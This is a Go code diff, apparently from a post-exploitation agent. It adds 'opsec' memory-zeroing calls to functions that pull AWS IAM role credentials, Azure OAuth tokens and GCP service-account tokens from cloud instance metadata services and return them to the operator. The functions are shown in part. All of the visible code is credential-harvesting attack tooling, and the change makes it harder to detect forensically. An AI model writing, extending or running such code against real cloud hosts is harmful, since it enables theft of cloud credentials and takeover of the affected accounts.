@@ -104,6 +104,7 @@ func cloudDetect(timeout time.Duration) structs.CommandResult {
 		if region := metadataGet(awsMetaURL+"placement/region", timeout, map[string]string{"X-aws-ec2-metadata-token": token}); region != "" {
 			sb.WriteString(fmt.Sprintf("    Region: %s\n", region))
 		}
+		structs.ZeroString(&token) // opsec: clear IMDSv2 session token
 		detected = true
 	} else if id := metadataGet(awsMetaURL+"instance-id", timeout, nil); id != "" {
 		sb.WriteString("[+] AWS EC2 detected (IMDSv1 — no token required)\n")
@@ -439,6 +440,7 @@ func awsGetCreds(timeout time.Duration) string {
 		creds := metadataGet(awsCredsURL+role, timeout, h)
 		if creds != "" {
 			sb.WriteString(formatAWSCredsJSON(creds))
+			structs.ZeroString(&creds) // opsec: clear IAM credentials JSON
 		}
 	}
 	return sb.String()
@@ -552,6 +554,7 @@ func azureGetToken(timeout time.Duration) string {
 	}
 
 	sb.WriteString(formatAzureTokenJSON(resp))
+	structs.ZeroString(&resp) // opsec: clear OAuth token response
 	return sb.String()
 }
 
@@ -680,6 +683,7 @@ func gcpGetToken(timeout time.Duration) string {
 		tokenResp := metadataGet(gcpServiceAcctURL+acct+"token", timeout, h)
 		if tokenResp != "" {
 			sb.WriteString(formatGCPTokenJSON(tokenResp))
+			structs.ZeroString(&tokenResp) // opsec: clear GCP access token response
 		}
 	}
 	return sb.String()
